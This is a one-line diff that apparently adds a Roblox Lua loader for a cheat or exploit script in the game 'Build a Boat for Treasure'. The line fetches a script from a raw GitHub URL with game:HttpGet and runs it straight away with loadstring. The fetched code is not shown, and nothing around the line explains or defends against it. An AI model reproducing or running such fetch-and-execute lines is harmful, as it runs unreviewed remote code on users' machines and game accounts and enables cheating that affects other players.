@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/build-a-boat-for-treasure-spam2-xv952m4uhqw6x9.lua"))()
